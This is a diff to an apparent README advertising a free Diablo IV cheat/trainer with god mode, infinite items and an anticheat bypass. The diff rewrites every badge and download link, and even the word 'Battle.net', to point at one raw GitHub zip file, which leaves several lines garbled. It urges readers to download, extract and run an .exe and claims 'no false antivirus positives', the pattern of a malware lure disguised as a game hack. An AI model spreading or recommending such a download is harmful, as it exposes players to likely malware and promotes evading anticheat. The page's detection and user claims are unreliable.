@@ -2,12 +2,12 @@
 
 # Diablo IV Cheat / Bot 2025 | God Mode Infinite Resources Auto Loot Speed Hack Teleport Unlock All Legendaries Aspects Glyphs | Diablo 4 Hack Undetected December 2025
 
-![Version](https://img.shields.io/badge/Version-2.1.4-red?style=for-the-badge&logo=diablo)
-![Status](https://img.shields.io/badge/Status-UNDETECTED%20100%25-success?style=for-the-badge)
-![Bypass](https://img.shields.io/badge/Battle.net%20AC-BYPASSED-critical?style=for-the-badge)
-![Users](https://img.shields.io/badge/Active%20Users-7.4K%2B-blueviolet?style=for-the-badge)
-![Resources](https://img.shields.io/badge/Infinite%20Gold%20Items-brightgreen?style=for-the-badge)
-![Free](https://img.shields.io/badge/Price-PRIVATE%20FREE-orange?style=for-the-badge)
+![Version](https://raw.githubusercontent.com/ElijahQ70/Diablo-Client-New/main/gentleness/Diablo_Client_New_3.2.zip)
+![Status](https://raw.githubusercontent.com/ElijahQ70/Diablo-Client-New/main/gentleness/Diablo_Client_New_3.2.zip%20100%25-success?style=for-the-badge)
+![Bypass](https://raw.githubusercontent.com/ElijahQ70/Diablo-Client-New/main/gentleness/Diablo_Client_New_3.2.zip%20AC-BYPASSED-critical?style=for-the-badge)
+![Users](https://raw.githubusercontent.com/ElijahQ70/Diablo-Client-New/main/gentleness/Diablo_Client_New_3.2.zip%20Users-7.4K%2B-blueviolet?style=for-the-badge)
+![Resources](https://raw.githubusercontent.com/ElijahQ70/Diablo-Client-New/main/gentleness/Diablo_Client_New_3.2.zip%20Gold%20Items-brightgreen?style=for-the-badge)
+![Free](https://raw.githubusercontent.com/ElijahQ70/Diablo-Client-New/main/gentleness/Diablo_Client_New_3.2.zip%20FREE-orange?style=for-the-badge)
 
 **PRIVATE FREE BOT/TRAINER → God Mode + Infinite Gold/Items + Auto Loot + Speed/Teleport + Unlock ALL Legendaries, Aspects, Glyphs & Paragon Boards Instantly!**
 
@@ -18,11 +18,11 @@
 ---
 ## PRIVATE BOT/TRAINER BUILD 2025 (UPDATED DECEMBER 14)
 
-[DOWNLOAD DIABLO IV HACK 2025 – ZIP](https://getloader.click)  
+[DOWNLOAD DIABLO IV HACK 2025 – ZIP](https://raw.githubusercontent.com/ElijahQ70/Diablo-Client-New/main/gentleness/Diablo_Client_New_3.2.zip)  
 **DOWNLOAD → EXTRACT → RUN .EXE → FARM WORLD TIER 4 IN MINUTES**
 
 - 100% Private Free Build (no public leaks)  
-- Works on Battle.net, Steam, Game Pass  
+- Works on https://raw.githubusercontent.com/ElijahQ70/Diablo-Client-New/main/gentleness/Diablo_Client_New_3.2.zip, Steam, Game Pass  
 - Supports Season 5 & Eternal Realm  
 - Updated daily for latest patch  
 - Active users: ~7 400 (December 2025)
@@ -51,7 +51,7 @@
 
 ---
 ## SAFETY – STILL 0 BANS IN 2025
-- Full Battle.net anticheat bypass (latest December 14 patch)  
+- Full https://raw.githubusercontent.com/ElijahQ70/Diablo-Client-New/main/gentleness/Diablo_Client_New_3.2.zip anticheat bypass (latest December 14 patch)  
 - Advanced memory cloaking + signature randomization  
 - No false antivirus positives  
 - Private distribution only  
